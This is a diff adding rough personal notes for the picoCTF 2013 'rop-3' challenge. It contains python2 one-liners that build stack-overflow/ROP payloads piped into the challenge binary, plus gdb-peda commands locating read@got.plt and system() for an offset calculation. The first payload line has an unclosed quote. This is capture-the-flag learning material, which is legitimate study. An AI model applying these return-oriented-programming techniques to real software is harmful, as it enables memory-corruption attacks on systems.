@@ -1,0 +1,14 @@
+python2 -c 'print "A"*140 + "BBBB" > eip.txt
+python2 -c 'print "A"*140 + "\x49\xf5\xfc\xf7"+ "CCCC" + "\x01\x00\x00\x00" + "\x00\xa0\x04\x08" + "\x04\x00\x00\x00"' | ./rop3 | hexdump -C
+
+
+eip 0xf7fcf549
+
+gdb-peda$ x 0x0804a000
+   0x804a000 <read@got.plt>:	xor    BYTE PTR ds:0x9d40f7eb,dl
+gdb-peda$ p system
+$2 = {<text variable, no debug info>} 0xf7e02370 <system>
+gdb-peda$ p 0x804a000 - 0xf7e02370
+
+
+https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013/rop-3
